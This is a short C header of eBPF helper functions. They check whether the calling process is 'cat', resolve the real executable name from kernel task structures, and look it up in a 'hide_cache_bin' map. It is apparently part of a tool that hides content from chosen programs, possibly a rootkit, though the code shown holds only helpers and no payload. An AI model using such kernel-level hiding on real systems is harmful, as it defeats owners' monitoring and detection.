/**
 * Contains bpf utility functions non like utils.h 
 * 
 * @author Yekuuun
 */

#ifndef BPF_COMMON_H
#define BPF_COMMON_H

#include "bpf_config.h"
#include "bpf_debug.h"
#include "../lib/ftlib.h"

/**
 * Nigthmares from Windows...
 */
static __always_inline void __rtl_secure_zero_memory(void *dst, __u32 size){ 
    __builtin_memset(dst, 0, size);
}

/**
 * Simple helper function to identify if current COMM is the "cat" binary
 */
static __always_inline int __is_binary_cat(void) {
    char comm[TASK_COMM_LEN] = {0};
    bpf_get_current_comm(comm, sizeof(comm));
    
    //32 overkill but ok.
    return ft_strcmp(comm, CAT_BIN, 32) == 0;
}

/**
 * Base function to resolve real binary filename. Avoiding using comm since is easily updatable.
 * 
 * @param dst  => buffer to contain result (note : the *dst contains enough memory for result)
 * @param sdst => strlen of *dst
 * 
 * @return 0 if success, < 0 if error.
 */
static __always_inline int __resolve_exe_basename(char *dst, size_t sdst) {
    struct task_struct *tsk = (void*)bpf_get_current_task();
    if(!tsk)
        return -1;

    struct mm_struct *mm = BPF_CORE_READ(tsk, mm);
    if(!mm) //kernel thread => no binary.
        return -1;

    struct file *exe = BPF_CORE_READ(mm, exe_file);
    if(!exe)
        return -1;

    const unsigned char *name = BPF_CORE_READ(exe, f_path.dentry, d_name.name);
    if(!name)
        return -1;

    return bpf_core_read_str(dst, sdst, name);
}

/**
 * Utility function to check in hide_from_cache has bin target.
 */
static __always_inline int __is_target_bin(void) {
    char bin[DNAME_MAX] = {0};
    if(__resolve_exe_basename(bin, sizeof(bin)) < 0)
        return 0;
    
    __u8 *bin_cache_flag = bpf_map_lookup_elem(&hide_cache_bin, &bin);
    if(!bin_cache_flag)
        return 0;

    return *bin_cache_flag == 1;
}

#endif